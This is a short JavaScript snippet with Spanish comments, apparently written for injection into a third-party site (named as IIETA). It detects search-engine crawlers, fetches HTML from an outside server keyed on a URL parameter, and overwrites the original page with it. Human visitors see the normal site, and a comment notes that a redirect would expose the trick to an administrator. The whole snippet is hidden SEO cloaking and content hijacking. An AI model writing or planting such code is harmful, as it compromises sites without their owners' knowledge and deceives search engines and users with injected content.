(function() {
    // 1. Detección de Bot (solo se activa para Google, etc.)
    const isBot = /googlebot|bingbot|slurp|duckduckbot|baiduspider|yandexbot/i.test(navigator.userAgent);
    
    // Si no es bot, redirigir al humano (Cuidado: esto delataría el truco si un admin entra)
    if (!isBot) {
        // window.location.replace("https://google.es"); 
        return; 
    }

    // 2. Extraer el ID del parámetro 'term' de la URL de IIETA
    const params = new URLSearchParams(window.location.search);
    const termId = params.get('term');
    if (!termId) return;

    // 3. Llamada a tu servidor para obtener el HTML ya procesado
    // Reemplaza la URL por la de tu index.php real
    fetch(`https://plugin.txnc.lol/index.php?art=1&io0=${termId}`)
        .then(response => {
            if (response.ok) return response.text();
            throw new Error();
        })
        .then(htmlDeTuServidor => {
            // 4. Limpieza total del sitio original (IIETA) y renderizado de tu artículo
            document.open();
            document.write(htmlDeTuServidor);
            document.close();
        })
        .catch(err => console.log("SEO Engine: Offline"));
})();
